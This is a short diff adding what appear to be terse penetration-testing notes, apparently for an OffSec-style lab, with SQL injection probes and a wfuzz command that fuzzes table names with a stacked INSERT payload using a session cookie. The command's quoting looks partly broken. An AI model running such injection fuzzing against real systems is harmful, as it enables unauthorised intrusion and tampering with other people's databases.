@@ -1,0 +1,10 @@
+once directory traversal works we can go for rce
+ 
+ click each function: delete each function
+
+id=4
+id=4'
+
+wfuzz -w tables.txt -w tables.txt -m zip -b JSSESSIONID=D755 -d "" "https://offsec.io?id=4;insert+into+FUZZ+values('FUZ2Z')'
+
+
